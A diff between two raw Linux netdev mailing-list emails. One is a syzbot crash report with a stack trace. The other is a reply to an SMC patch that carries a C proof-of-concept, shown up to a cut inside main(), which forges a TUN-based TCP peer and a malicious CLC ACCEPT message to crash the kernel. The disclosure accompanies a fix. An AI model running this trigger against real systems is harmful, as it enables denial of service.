@@ -1,183 +1,380 @@
-Return-Path: <netdev+bounces-286456-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-286457-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id 6BaMOOZ1AWr9ZwEAu9opvQ
-	(envelope-from <netdev+bounces-286456-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 08:23:34 +0200
+	id GKtiET93AWpGaQEAu9opvQ
+	(envelope-from <netdev+bounces-286457-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 08:29:19 +0200
 X-Original-To: lists+netdev@lfdr.de
-Received: from tor.lore.kernel.org (tor.lore.kernel.org [172.105.105.114])
-	by mail.lfdr.de (Postfix) with ESMTPS id 60ACC508826
-	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 08:23:34 +0200 (CEST)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
+	by mail.lfdr.de (Postfix) with ESMTPS id A471050887D
+	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 08:29:18 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by tor.lore.kernel.org (Postfix) with ESMTP id 66D0B3006B0D
-	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 06:23:33 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id 029AF30136A9
+	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 06:29:14 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 40DEE2D3725;
-	Mon, 11 May 2026 06:23:31 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 0CC5E2DCF61;
+	Mon, 11 May 2026 06:29:13 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="mCQ7wY+I"
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-oo1-f77.google.com (mail-oo1-f77.google.com [209.85.161.77])
+Received: from mail-pg1-f182.google.com (mail-pg1-f182.google.com [209.85.215.182])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BBFAB2C0299
-	for <netdev@vger.kernel.org>; Mon, 11 May 2026 06:23:29 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.161.77
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1778480611; cv=none; b=QNhNs5FwYHnC0AwXDVdy5cKkIcAW23V2QahYQRXb/jY3JlmBNc/pIQdLvVu4Z1p8Y9CIXOHQ7QPWw2cpGvTg2eE3u0e1SbUIYXwQrl8OmTyVg+ZgRvT76Tcl4bA+hmSvMHIhgqD6cXPjMmVx2Uw9INqwCbCzmGGLwGlnPQak8xc=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1778480611; c=relaxed/simple;
-	bh=2/R7v9mNHMjP8cDFOGQ/TPV1slRjThbnyFADaLLiPGo=;
-	h=MIME-Version:Date:Message-ID:Subject:From:To:Content-Type; b=Gu/h3kW5oKlGV8NwVDcXoXCSuUtHutcpVWvA2FkMSTNPIQSwVKLb4fey3RfCj1R4jAuVPQrK4EzSCyS562+NJx8OuNLQiuuIW/GLi2r90B8Ql/8EMH1DJzPY1aseca7KTWqMPywJwrpeBtxg9UezrB35d8odoMfg6uffMGqNZs8=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=syzkaller.appspotmail.com; spf=pass smtp.mailfrom=M3KW2WVRGUFZ5GODRSRYTGD7.apphosting.bounces.google.com; arc=none smtp.client-ip=209.85.161.77
-Authentication-Results: smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=syzkaller.appspotmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=M3KW2WVRGUFZ5GODRSRYTGD7.apphosting.bounces.google.com
-Received: by mail-oo1-f77.google.com with SMTP id 006d021491bc7-679c5ed0942so5651105eaf.1
-        for <netdev@vger.kernel.org>; Sun, 10 May 2026 23:23:29 -0700 (PDT)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8EB162DA75C
+	for <netdev@vger.kernel.org>; Mon, 11 May 2026 06:29:11 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.182
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1778480952; cv=pass; b=iYGOVSuiKWV87qcdRMBU857wjH2SEF2YVuRm388CW+0n83RmooUJccvdyyzlJWug319AOK6IuuUqYGZdCePTcWFgUZzNeZ93Lu7i/R6qhy+s4RP2JuJ+/XTFgjnqY/6+9bcA4Zr8UmNmMPHsKshudIjCtbVSjxjYkP0e3MP5sos=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1778480952; c=relaxed/simple;
+	bh=UfqjIUwBYKIBDa+U6ZmRbnZQAg8V/f1GM0bYT7rn11w=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=ujRbpj8nhnKUVs2ubkxCa6UOyPqjF998NN4SCGpb4v6id37xpLbb2FHsKbohdvuoi9N1ztEVxaYKsIVRB7K2TkoF0MkJVQzpvK6A+fZsHdfwKCrTFCPxgS9YeOyoUrU0MV9wX8vhnJTX+xdner6xe405Nx8pAytm2HAiqCYQcrU=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=mCQ7wY+I; arc=pass smtp.client-ip=209.85.215.182
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
+Received: by mail-pg1-f182.google.com with SMTP id 41be03b00d2f7-c8025aecc40so1745428a12.0
+        for <netdev@vger.kernel.org>; Sun, 10 May 2026 23:29:11 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1778480951; cv=none;
+        d=google.com; s=arc-20240605;
+        b=R4SgRVjxAJVQE7eRP/qfOKt+2p+j3Z1ZeYrfoNacfAUdiKxirTeqOHPjhTHOzqgZyu
+         MGexmZlpe7Swcsm9LczHRgIlmALUs1uYU1qaPSbtKSNGiGSYbiW1vYEar+ptg+QL22AW
+         sqOdjhqhazhtL1R3uYvEqyHRHfQsqW0XUcQJnsvH7rqJIpSX3HstBfjUcwgx9tn/jAeN
+         //Q3uEhvFZZigVvStj985WHs6exEUxtdhlD2g5B8PegSulY1mWCUOk5eB42QeVPv214X
+         qPY7WtwiL89XoT/vzdlgdyIgnfQi+1/t07Ft3JzFx7r5Mxbh8KU9tJjM3cghysSug9b/
+         hoZQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=JaSjt2o3QJ/HfrQwhvi9bOFakjV7hxzYfi162/WlEJw=;
+        fh=Hq1cvWapsjxR4l17V6ppExiZa3CdY03gDQT/0nr24JE=;
+        b=G2a5uQls6yZZ7jGW/haXMN8oKIoRS240QyHvvRikGFN5/OwkZcFeBsAKDlB/GMrOlq
+         PoQhZbSeNb0OAw9iIIP5BQFjM1/KRUn98UCyVikZF4XBazdkVx4BJs1omK5ev1MFYR6s
+         gD7ajUUQ2iQ8BljPJ5S1loxK9OI5jMzu0GBzeT0WwJgJDWxeXvXMICiPQbsSd0BA6B11
+         QJDOsAHX6vx3A1Yc9IH34upBhhlnxfC9Vo+bDAhLFMzh5R3YOcvUjWnayRo43aXip/mH
+         AzfMes1k0DjpY2QQrE7JhR2wuSg8KtSpQSYb8UWS4pMidk24/FLyPrEQ6f7xDCZaEw7l
+         r4dQ==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=asu.edu; s=google; t=1778480951; x=1779085751; darn=vger.kernel.org;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=JaSjt2o3QJ/HfrQwhvi9bOFakjV7hxzYfi162/WlEJw=;
+        b=mCQ7wY+Iv/CDxkYCFFwTV6cKP6MDy2ZyGkvB/D3SgsFzuayd5RiCZS3xqvQ6TMQDMa
+         H7g9P4tFduGL+AonW4wXS6KEYUBAXITXR1JKSSLQJyHsKh/IiEVuE+F5vp1rjEOP1gMW
+         g4NQlGAxfSWPVqz8dQnUiR/S6X0y7yAAgfLIV0K7JO71Vc+zx+oflPZMgXviFuKpQL5C
+         bljj4NRRXf2CKTCPt3tl0wXYKd2hkJtvxc+0Q/7xFBCY83aWXz9PhXcMBgkG8mHG9TOd
+         nvve5DQM3KbUwj5Pt99Lh2fDvm4jqReNmWaz8s2x9Bqu7U9TMrkxYE8fgXkulp8sRb63
+         d8CA==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1778480609; x=1779085409;
-        h=to:from:subject:message-id:date:mime-version:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=VaFPG7gEHXdorxY3MrBaNDqtO3iWXxWBFIcMFjQggaU=;
-        b=mu4zrjLSpjcnPPpne3qz9G9PiTHGt0lCjDU03uTE6oftdc08RM6g1Igc2T8y5Z5nY8
-         e2HTcdzXrfeheuFD0QbI+sPQEYF+GO7A+JmVMyyIoZgxptkLUNEJIH64Dsl2EGbqcabJ
-         E3jgxZvqzI+nTzTGou7lcPE9g5s/iPJi0jBKo7mmI+rZj/+HJnsyQ+rl1Gr/KO1p9E47
-         vMcXEkUbDkLmCiiQghGmWbXoSfZD7xCrLBmlTvIUmpmlIKIzSleAFVgrP7ZfJ6ft0S6p
-         hme6tySHACznAh+mjQYWZwSiFkJFK9aPqrYfm6ERz8fFqBTyYIqhrTC2agY50QlEWBVc
-         WS5A==
-X-Forwarded-Encrypted: i=1; AFNElJ+uUEkunpjGovT7j7xB2sc2Xvy9Yn9ay9dTJ6eyTQBR3wmiybv6AbaOd6M/Noc4P/T9tfnAXDY=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzHCNaw9kUYAawNODBp4DMR8uF5gxRRidbw5yVqBKRHsuD3wsBu
-	kB2H6wZvn+74W+3x+8tY1rSVsOWmsXovT5LvqFMdCdRDLlx/TDU1fV2HwAiqFbO3fJm7yPD+yxO
-	RMxYFUI2C23JeVQSMoKBurtT3MYlt/7dCrJ4v5lBV3EHYCmklqa/QV51I/sM=
+        d=1e100.net; s=20251104; t=1778480951; x=1779085751;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=JaSjt2o3QJ/HfrQwhvi9bOFakjV7hxzYfi162/WlEJw=;
+        b=aOY/nCjxMxHGQ60QDzllff1pcXRmRALvdKM2jSZZiiablh9lM4VS5ctT/lJuKhOD/R
+         fkVZnjQcKma6yeRkhqkvwOpo/9TZ7LVS+YjQiGRQb3eWGta/CDBcylotv3HXev8y3kUr
+         7DsLiHWrmGvpthiLGza7lbR4POd2Ay+14ROd3a16uzqDObsZXNrsX0gqfK+Let+cn/+o
+         UZOPGl81K/scr5FenEXjcaHIO8qyxYBXth+O28t18VufFAo8hTczVaOLTbABEuI3A2Re
+         qk6WaHW2WE10THKrxpi7mbD6w4PMJuQcFoXqPGn24nUyDWwewDZqD0wpToEe/4LI0u76
+         tUPQ==
+X-Gm-Message-State: AOJu0YwB8eTNnI30l4FGQ8fJvwb3Up89CjsZnJKNYHEx6pfwsbaHHOtD
+	/nq/nyBYNYatepSJDGxR37VrwM6w9U+luKCuk6ctFdvN3v/MVTwZrL+fM/wzIzPvWeVcB3/57cl
+	1BGEyVSX9QUeBKbtQRhAfX5VWsH5OuvQcog95r6gbYqTJ9CTmChh5lr/I
+X-Gm-Gg: Acq92OEu65rXba73AzAkBsvQ/hUjYw3MpOHbRD6uZDALmNv+SCKu2kV6Y5VKl4TwKG/
+	r0egiZYoTb+wEIWNkugSXZdyMOHF+XkhyeoVoCVIS9gJ8Wej6QPxyON4K/1NxWv8WL5ykzjJnV2
+	J9IeXYfwQL2Ofvdk4gBNwvogc2LHstnHOcz+00OuZMRNJFbFQjzwZhgztoKz15fGnWPSIkZP8qa
+	Tbgosu+EnJl1VNO45ZiXB5CM0R9gX/4+1sNA6MhupRE2bor4YOhblnfNZ/3iGA0ttxzYpJpsdJh
+	S9xGpD+s
+X-Received: by 2002:a05:6a21:3399:b0:3a2:edff:2975 with SMTP id
+ adf61e73a8af0-3aa8c1e7570mr15729038637.25.1778480950615; Sun, 10 May 2026
+ 23:29:10 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-Received: by 2002:a05:6820:1622:b0:694:980a:2c47 with SMTP id
- 006d021491bc7-69998bd405bmr12037677eaf.0.1778480608729; Sun, 10 May 2026
- 23:23:28 -0700 (PDT)
-Date: Sun, 10 May 2026 23:23:28 -0700
-X-Google-Appengine-App-Id: s~syzkaller
-X-Google-Appengine-App-Id-Alias: syzkaller
-Message-ID: <6a0175e0.a00a0220.1c3806.0016.GAE@google.com>
-Subject: [syzbot] [net?] WARNING in qdisc_tree_reduce_backlog (2)
-From: syzbot <syzbot+9744ccaabe337c6fb123@syzkaller.appspotmail.com>
-To: davem@davemloft.net, edumazet@google.com, horms@kernel.org, 
-	jhs@mojatatu.com, jiri@resnulli.us, kuba@kernel.org, 
-	linux-kernel@vger.kernel.org, netdev@vger.kernel.org, pabeni@redhat.com, 
-	syzkaller-bugs@googlegroups.com
+References: <20260511062138.2839584-1-xmei5@asu.edu>
+In-Reply-To: <20260511062138.2839584-1-xmei5@asu.edu>
+From: Xiang Mei <xmei5@asu.edu>
+Date: Sun, 10 May 2026 23:28:59 -0700
+X-Gm-Features: AVHnY4IxiLLsMjpeijYDQGsbC35Qn9XIdiNi9mC52TQugcJ8Pq_f6893lz_KTdU
+Message-ID: <CAPpSM+TRZA55VdLdP1oMCoV8wONKgP66LtW4zfA2XuHu7KBkQQ@mail.gmail.com>
+Subject: Re: [PATCH net] net/smc: reject CHID-0 ACCEPT that matches an empty
+ ism_dev slot
+To: netdev@vger.kernel.org
+Cc: alibuda@linux.alibaba.com, dust.li@linux.alibaba.com, 
+	sidraya@linux.ibm.com, wenjia@linux.ibm.com, ubraun@linux.ibm.com, 
+	linux-rdma@vger.kernel.org, linux-s390@vger.kernel.org, bestswngs@gmail.com
 Content-Type: text/plain; charset="UTF-8"
-X-Rspamd-Queue-Id: 60ACC508826
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: A471050887D
 X-Rspamd-Server: lfdr
-X-Spamd-Result: default: False [-0.36 / 15.00];
-	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
-	URI_HIDDEN_PATH(1.00)[https://syzkaller.appspot.com/x/.config?x=f2e8ebfec4636d32];
-	R_SPF_ALLOW(-0.20)[+ip4:172.105.105.114:c];
+X-Spamd-Result: default: False [3.34 / 15.00];
+	SEM_URIBL(3.50)[asu.edu:email,asu.edu:dkim];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
-	DMARC_POLICY_SOFTFAIL(0.10)[appspotmail.com : SPF not aligned (relaxed), No valid DKIM,none];
+	BAD_REP_POLICIES(0.10)[];
 	HAS_LIST_UNSUB(-0.01)[];
-	MISSING_XM_UA(0.00)[];
-	ASN(0.00)[asn:63949, ipnet:172.105.96.0/20, country:SG];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	FORGED_SENDER_MAILLIST(0.00)[];
-	TAGGED_FROM(0.00)[bounces-286456-lists,netdev=lfdr.de,9744ccaabe337c6fb123];
-	RCVD_TLS_LAST(0.00)[];
-	RCVD_COUNT_THREE(0.00)[4];
-	SUBJECT_HAS_QUESTION(0.00)[];
-	REDIRECTOR_URL(0.00)[goo.gl];
-	TAGGED_RCPT(0.00)[netdev];
-	PRECEDENCE_BULK(0.00)[];
 	FROM_HAS_DN(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[syzbot@syzkaller.appspotmail.com,netdev@vger.kernel.org];
+	DMARC_POLICY_ALLOW(0.00)[asu.edu,none];
+	FREEMAIL_CC(0.00)[linux.alibaba.com,linux.ibm.com,vger.kernel.org,gmail.com];
+	TAGGED_FROM(0.00)[bounces-286457-lists,netdev=lfdr.de];
+	RCVD_TLS_LAST(0.00)[];
+	R_DKIM_ALLOW(0.00)[asu.edu:s=google];
+	DKIM_TRACE(0.00)[asu.edu:+];
+	FORGED_SENDER_MAILLIST(0.00)[];
+	RCVD_COUNT_THREE(0.00)[4];
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
+	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
 	MIME_TRACE(0.00)[0:+];
 	TO_DN_NONE(0.00)[];
-	R_DKIM_NA(0.00)[];
-	NEURAL_HAM(-0.00)[-0.998];
-	RCPT_COUNT_SEVEN(0.00)[10];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[appspotmail.com:email,tor.lore.kernel.org:helo,tor.lore.kernel.org:rdns,goo.gl:url,googlegroups.com:email,storage.googleapis.com:url]
+	PRECEDENCE_BULK(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
+	MISSING_XM_UA(0.00)[];
+	NEURAL_HAM(-0.00)[-0.894];
+	TAGGED_RCPT(0.00)[netdev];
+	RCPT_COUNT_SEVEN(0.00)[9];
+	ARC_ALLOW(0.00)[subspace.kernel.org:s=arc-20240116:i=2];
+	R_SPF_ALLOW(0.00)[+ip4:172.234.253.10:c];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[asu.edu:email,asu.edu:dkim,mail.gmail.com:mid,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
 X-Rspamd-Action: no action
 
-Hello,
+Thanks for your attention to this bug. Here are some resources to help
+you trigger the bug.
 
-syzbot found the following issue on:
+Required key configs:
+```
+CONFIG_SMC=3Dy
+CONFIG_DIBS=3Dy
+CONFIG_DIBS_LO=3Dy
+```
 
-HEAD commit:    5862221fdded Merge tag 'parisc-for-7.1-rc3' of git://git.k..
-git tree:       upstream
-console output: https://syzkaller.appspot.com/x/log.txt?x=12a4bb26580000
-kernel config:  https://syzkaller.appspot.com/x/.config?x=f2e8ebfec4636d32
-dashboard link: https://syzkaller.appspot.com/bug?extid=9744ccaabe337c6fb123
-compiler:       Debian clang version 21.1.8 (++20251221033036+2078da43e25a-1~exp1~20251221153213.50), Debian LLD 21.1.8
+Here is a PoC trigger that causes the intended crash shown in the
+commit message:
+```c
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <endian.h>
+#include <fcntl.h>
+#include <linux/if_tun.h>
+#include <net/if.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <pthread.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <unistd.h>
 
-Unfortunately, I don't have any reproducer for this issue yet.
+#define AF_SMC 43
+static int tun_fd;
+static uint32_t my_ip, peer_ip; /* network byte order */
+static const uint16_t PEER_PORT =3D 9999;
 
-Downloadable assets:
-disk image: https://storage.googleapis.com/syzbot-assets/cd9aba7e59bf/disk-5862221f.raw.xz
-vmlinux: https://storage.googleapis.com/syzbot-assets/29af9d57e9af/vmlinux-5862221f.xz
-kernel image: https://storage.googleapis.com/syzbot-assets/02749594fd1e/bzImage-5862221f.xz
+static uint16_t csum(const void *p, int n, uint32_t s) {
+const uint16_t *q =3D p;
+while (n > 1) { s +=3D *q++; n -=3D 2; }
+if (n) s +=3D *(const uint8_t *)q;
+while (s >> 16) s =3D (s & 0xffff) + (s >> 16);
+return ~s;
+}
 
-IMPORTANT: if you fix the issue, please add the following tag to the commit:
-Reported-by: syzbot+9744ccaabe337c6fb123@syzkaller.appspotmail.com
+static uint16_t tcp_csum(uint32_t sa, uint32_t da, const void *h, int n) {
+struct { uint32_t s, d; uint8_t z, p; uint16_t l; } __attribute__((packed))
+ph =3D { sa, da, 0, IPPROTO_TCP, htons(n) };
+uint32_t s =3D 0;
+for (unsigned i =3D 0; i < sizeof(ph) / 2; i++) s +=3D ((uint16_t *)&ph)[i]=
+;
+return csum(h, n, s);
+}
 
-------------[ cut here ]------------
-parentid != TC_H_ROOT
-WARNING: net/sched/sch_api.c:797 at qdisc_tree_reduce_backlog+0x3d9/0x480 net/sched/sch_api.c:797, CPU#1: ktimers/1/29
-Modules linked in:
-CPU: 1 UID: 0 PID: 29 Comm: ktimers/1 Tainted: G             L      syzkaller #0 PREEMPT_{RT,(full)} 
-Tainted: [L]=SOFTLOCKUP
-Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 04/18/2026
-RIP: 0010:qdisc_tree_reduce_backlog+0x3d9/0x480 net/sched/sch_api.c:797
-Code: ff ff 4c 89 ef e8 b7 85 12 f9 e9 42 ff ff ff e8 4d 7c ab f8 eb 17 e8 46 7c ab f8 eb 10 e8 3f 7c ab f8 eb 09 e8 38 7c ab f8 90 <0f> 0b 90 e8 7f 72 03 02 89 c3 31 ff 89 c6 e8 d4 80 ab f8 85 db 74
-RSP: 0018:ffffc90000a3f768 EFLAGS: 00010246
-RAX: ffffffff8918f818 RBX: 0000000000000008 RCX: ffff88801daa3d80
-RDX: 0000000000000100 RSI: 0000000000000000 RDI: 0000000000000100
-RBP: dffffc0000000000 R08: 0000000000000000 R09: 0000000000000100
-R10: 0000000000000100 R11: 00000000ffffffff R12: 00000000000affe0
-R13: dffffc0000000000 R14: ffffc90000a3f8e0 R15: ffff88803d0a7800
-FS:  0000000000000000(0000) GS:ffff888126279000(0000) knlGS:0000000000000000
-CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-CR2: 000055558bcbda38 CR3: 00000000403d8000 CR4: 00000000003526f0
-DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000003e4f
-DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
-Call Trace:
- <TASK>
- sfq_rehash net/sched/sch_sfq.c:598 [inline]
- sfq_perturbation+0x205d/0x22d0 net/sched/sch_sfq.c:615
- call_timer_fn+0x192/0x5e0 kernel/time/timer.c:1748
- expire_timers kernel/time/timer.c:1799 [inline]
- __run_timers kernel/time/timer.c:2374 [inline]
- __run_timer_base+0x6a3/0x9f0 kernel/time/timer.c:2386
- run_timer_base kernel/time/timer.c:2395 [inline]
- run_timer_softirq+0x103/0x170 kernel/time/timer.c:2406
- handle_softirqs+0x1de/0x6d0 kernel/softirq.c:622
- __do_softirq kernel/softirq.c:656 [inline]
- run_ktimerd+0x69/0x100 kernel/softirq.c:1151
- smpboot_thread_fn+0x541/0xa50 kernel/smpboot.c:160
- kthread+0x388/0x470 kernel/kthread.c:436
- ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
- ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
- </TASK>
+/* Send IPv4+TCP packet on the TUN device. opt_len must be multiple of 4. *=
+/
+static void tx(uint16_t sport, uint16_t dport, uint32_t seq, uint32_t ack,
+uint8_t flags, const void *opts, int opt_len,
+const void *payload, int plen)
+{
+uint8_t buf[2048] =3D {0};
+int thlen =3D sizeof(struct tcphdr) + opt_len;
+int tcplen =3D thlen + plen;
+int iplen =3D sizeof(struct iphdr) + tcplen;
+struct iphdr *ip =3D (struct iphdr *)buf;
+struct tcphdr *th =3D (struct tcphdr *)(buf + sizeof(*ip));
 
+ip->version =3D 4; ip->ihl =3D 5; ip->tot_len =3D htons(iplen);
+ip->ttl =3D 64; ip->protocol =3D IPPROTO_TCP;
+ip->saddr =3D peer_ip; ip->daddr =3D my_ip;
+ip->check =3D csum(ip, sizeof(*ip), 0);
 
----
-This report is generated by a bot. It may contain errors.
-See https://goo.gl/tpsmEJ for more information about syzbot.
-syzbot engineers can be reached at syzkaller@googlegroups.com.
+th->source =3D htons(sport); th->dest =3D htons(dport);
+th->seq =3D htonl(seq); th->ack_seq =3D htonl(ack);
+th->doff =3D thlen / 4; th->window =3D htons(65535);
+th->syn =3D !!(flags & 2); th->ack =3D !!(flags & 0x10);
+th->psh =3D !!(flags & 8); th->rst =3D !!(flags & 4);
+if (opt_len) memcpy(th + 1, opts, opt_len);
+if (plen) memcpy((uint8_t *)th + thlen, payload, plen);
+th->check =3D tcp_csum(peer_ip, my_ip, th, tcplen);
 
-syzbot will keep track of this issue. See:
-https://goo.gl/tpsmEJ#status for how to communicate with syzbot.
+if (write(tun_fd, buf, iplen) < 0) perror("tun write");
+}
 
-If the report is already addressed, let syzbot know by replying with:
-#syz fix: exact-commit-title
+/* TCP option: experimental, magic 0xE2D4C3D9 ("SMC"), len 6, + 2 NOPs. */
+static const uint8_t SMC_OPT[8] =3D { 254, 6, 0xE2, 0xD4, 0xC3, 0xD9, 1, 1 =
+};
 
-If you want to overwrite report's subsystems, reply with:
-#syz set subsystems: new-subsystem
-(See the list of subsystem names on the web dashboard)
+/* Build the malicious 78-byte SMC-D V2 CLC ACCEPT with d1.chid =3D 0. */
+static int build_accept(uint8_t out[78]) {
+memset(out, 0, 78);
+memcpy(out, "\xE2\xD4\xC3\xC4", 4); /* eyecatcher SMCD */
+out[4] =3D 0x02; /* type =3D ACCEPT */
+out[5] =3D 0x00; out[6] =3D 0x4E; /* length =3D 78 */
+out[7] =3D (2 << 4) | 1; /* version=3DV2, typev1=3DSMC_TYPE_D */
+/* d0.gid / d0.token: arbitrary; rest of d0/d1 zero (including d1.chid). */
+memcpy(out + 74, "\xE2\xD4\xC3\xC4", 4); /* trailer eyecatcher */
+return 78;
+}
 
-If the report is a duplicate of another one, reply with:
-#syz dup: exact-subject-of-another-report
+static void *responder(void *_) {
+uint8_t pkt[2048];
+uint32_t srv =3D 0xC0DECAFE, cli =3D 0;
+uint16_t cport =3D 0;
+int handshake =3D 0, sent_accept =3D 0;
 
-If you want to undo deduplication, reply with:
-#syz undup
+while (1) {
+int n =3D read(tun_fd, pkt, sizeof(pkt));
+if (n <=3D 0) continue;
+struct iphdr *ip =3D (struct iphdr *)pkt;
+struct tcphdr *th =3D (struct tcphdr *)(pkt + ip->ihl * 4);
+if (ip->protocol !=3D IPPROTO_TCP || ntohs(th->dest) !=3D PEER_PORT) contin=
+ue;
+cport =3D ntohs(th->source);
+int plen =3D ntohs(ip->tot_len) - ip->ihl * 4 - th->doff * 4;
+
+if (th->syn && !th->ack) { /* SYN */
+cli =3D ntohl(th->seq) + 1;
+tx(PEER_PORT, cport, srv, cli, 0x12, SMC_OPT, 8, NULL, 0);
+srv++;
+} else if (th->ack && !plen && !handshake) { /* SYN-ACK ACK */
+handshake =3D 1;
+} else if (handshake && plen > 0 && !sent_accept) { /* CLC PROPOSAL */
+cli =3D ntohl(th->seq) + plen;
+tx(PEER_PORT, cport, srv, cli, 0x10, NULL, 0, NULL, 0);
+uint8_t accept[78];
+int alen =3D build_accept(accept);
+tx(PEER_PORT, cport, srv, cli, 0x18, NULL, 0, accept, alen);
+srv +=3D alen;
+sent_accept =3D 1;
+}
+}
+}
+
+/* Bring up TUN with my_ip via ioctls (rootfs /sbin/ip is broken in repro).=
+ */
+static void setup_tun(void) {
+struct ifreq ifr =3D {0};
+ifr.ifr_flags =3D IFF_TUN | IFF_NO_PI;
+strncpy(ifr.ifr_name, "smc0", IFNAMSIZ - 1);
+tun_fd =3D open("/dev/net/tun", O_RDWR);
+if (tun_fd < 0 || ioctl(tun_fd, TUNSETIFF, &ifr) < 0) { perror("tun");
+exit(1); }
+
+int s =3D socket(AF_INET, SOCK_DGRAM, 0);
+struct sockaddr_in *sin =3D (struct sockaddr_in *)&ifr.ifr_addr;
+sin->sin_family =3D AF_INET; sin->sin_addr.s_addr =3D my_ip;
+ioctl(s, SIOCSIFADDR, &ifr);
+inet_pton(AF_INET, "255.255.255.0", &sin->sin_addr.s_addr);
+ioctl(s, SIOCSIFNETMASK, &ifr);
+ioctl(s, SIOCGIFFLAGS, &ifr);
+ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
+ioctl(s, SIOCSIFFLAGS, &ifr);
+close(s);
+}
+
+int main(void) {
+inet_pton(AF_INET, "10.0.0.1", &my_ip);
+inet_pton(AF_INET, "10.0.0.2", &peer_ip);
+setup_tun();
+
+pthread_t tid;
+pthread_create(&tid, NULL, responder, NULL);
+usleep(200 * 1000);
+
+int s =3D socket(AF_SMC, SOCK_STREAM, 0);
